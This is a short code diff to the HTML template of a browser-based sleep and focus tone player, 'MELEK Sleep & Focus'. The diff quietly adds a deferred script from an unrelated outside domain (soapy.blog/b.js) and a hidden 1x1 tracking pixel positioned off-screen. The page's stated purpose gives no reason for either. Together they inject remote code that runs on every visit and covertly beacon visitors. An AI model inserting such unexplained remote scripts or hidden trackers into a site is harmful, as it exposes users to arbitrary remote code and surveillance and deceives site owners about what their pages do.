@@ -361,7 +361,7 @@ export function renderPage(preset) {
 <meta name=viewport content="width=device-width,initial-scale=1">
 <title>MELEK Sleep &amp; Focus — binaural, isochronic &amp; 40 Hz gamma</title>
 <meta name=description content="A calm full-screen sleep and focus player: generative binaural beats, isochronic tones, and a 40 Hz gamma preset, synthesized live in your browser with the Web Audio API. No audio files, no licensing. Includes a sleep timer.">
-<meta name=robots content="index,follow,max-image-preview:large">${STYLE}</head><body>
+<meta name=robots content="index,follow,max-image-preview:large">${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body>
 ${body}
 </body></html>`;
 }
